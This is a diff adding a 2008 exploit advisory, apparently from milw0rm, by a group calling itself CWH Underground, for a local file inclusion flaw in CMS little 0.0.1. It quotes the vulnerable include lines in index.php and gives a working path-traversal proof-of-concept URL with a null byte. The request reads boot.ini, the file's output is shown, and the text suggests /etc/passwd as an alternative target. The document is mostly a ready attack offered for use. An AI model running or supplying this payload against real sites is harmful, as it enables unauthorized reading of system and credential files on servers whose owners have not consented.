@@ -1,0 +1,66 @@
+======================================================================
+  CMS little (index.php template) Local File Inclusion Vulnerability
+======================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 2 July 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : CMS little
+ VERSION     : 0.0.1
+ VENDOR      : N/A
+ DOWNLOAD    : http://downloads.sourceforge.net/littlecms/CMSLite.zip
+#####################################################
+
+--- Local File Inclusion ---
+
+-----------------------------
+ Vulnerable File (index.php)
+-----------------------------
+
+@Line 
+   64:  include $currentpage[template];
+   65:  } else {
+   66:	include $template.".tmpl.php";
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[cmslite_path]/index.php?template=[LFI]
+
+
+------
+ POC
+------
+
+[+] http://[Target]/[cmslite_path]/index.php?template=../../../../../../../../boot.ini%00
+
+
+    This exploit will open boot.ini in system file:
+
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+
+    You can change boot.ini to /etc/passwd%00 in linux OS.
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-07-02]
